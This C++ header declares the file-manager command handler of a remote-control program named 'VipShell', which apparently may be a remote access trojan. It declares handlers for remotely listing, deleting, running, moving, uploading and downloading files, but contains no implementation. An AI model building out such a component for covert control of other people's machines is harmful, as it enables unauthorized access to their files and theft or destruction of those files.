#pragma once
#include "defcommandproc.h"
#include <vector>

class CFileManage
{
public:
	CFileManage(void);
	~CFileManage(void);
public:
	bool GetFileInfo(LPCTSTR szPath);
	std::vector<tagVipShellFileInfo>& GetFileVector(){return m_Fileinfo;}
	std::vector<structFileInfo>& GetVector(){return m_info;}
	void GetRoot();
	bool IsDir(WIN32_FIND_DATA& file);
public:
	std::vector<structFileInfo> m_info;
	std::vector<tagVipShellFileInfo> m_Fileinfo;
private:
};

class CFileManageProc :
	public CDefCommandProc 
{
public:
	CFileManageProc(void);
	~CFileManageProc(void);
public:
protected:
	virtual void OnCmd_GetDoWork(tagVipShellCmd* info);
	virtual void OnFileManageGetRoot(tagVipShellCmd* info);
	virtual void OnFileManageGetFilePath(tagVipShellCmd* info);

	virtual void OnFileManageDelFile(tagVipShellCmd* info);
	virtual void OnFileManageRunFile(tagVipShellCmd* info);
	virtual void OnFileManageMoveFile(tagVipShellCmd* info);
	virtual void OnFileManageDownFile(tagVipShellCmd* info);
	virtual void OnFileManageUpFile(tagVipShellCmd* info);
	virtual void OnFileManageCreateDir(tagVipShellCmd* info);
protected:
	BOOL DelTree(LPCTSTR lpszPath);
	DWORD __GetFileSize(LPCTSTR szFile);
	bool __SendFile(LPCTSTR szFile);
	bool __RecvFile(LPCTSTR szFile, DWORD dwSize);
private:
	BYTE* __NewBuff(DWORD dwLen);
	BYTE* m_pSendBuf;
	DWORD m_dwBufLen;
	CFileManage m_hFileManage;
};
